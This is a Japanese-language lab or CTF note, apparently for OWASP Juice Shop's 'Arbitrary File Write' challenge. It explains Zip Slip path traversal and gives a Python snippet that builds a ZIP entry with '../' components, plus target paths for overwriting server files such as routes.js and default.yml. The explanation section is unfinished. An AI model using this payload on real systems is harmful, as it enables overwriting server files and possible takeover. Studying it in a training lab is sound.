# Arbitrary File Write ❌

**難易度:** ⭐⭐⭐⭐⭐⭐
**カテゴリ:** Zip Slip (パストラバーサル)
**目標:** ZIPファイルを使って任意の場所にファイルを書き込む

## ヒント

- **機能:** `/#/complain` のファイルアップロード
- **脆弱性:** ZIP 展開時のパストラバーサル検証不足
- **技術:** Zip Slip

## Zip Slip とは

```
ZIP ファイル内のファイル名に "../" を含めることで
展開先ディレクトリの外にファイルを書き込む攻撃
```

## 攻撃手順

```bash
# 1. 書き込みたいファイルを作成
echo "malicious content" > evil.txt

# 2. パストラバーサル付きのエントリ名で ZIP を作成
python3 << 'PYTHON'
import zipfile

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    # ../../ で親ディレクトリへ移動
    zf.write('evil.txt', '../../../../../../tmp/evil.txt')
PYTHON

# 3. アップロード
# /#/complain でファイルを選択してアップロード
```

## ターゲットパス

```
# サーバーの重要ファイルを上書き
../../../../../../app/routes.js
../../../../../../app/config/default.yml

# 任意のファイルを作成
../../../../../../tmp/test.txt
```

## 検証ポイント

- [ ] ZIP ファイルの作成
- [ ] アップロード成功
- [ ] ファイルが指定場所に作成されたか確認

## 解説

[未着手]
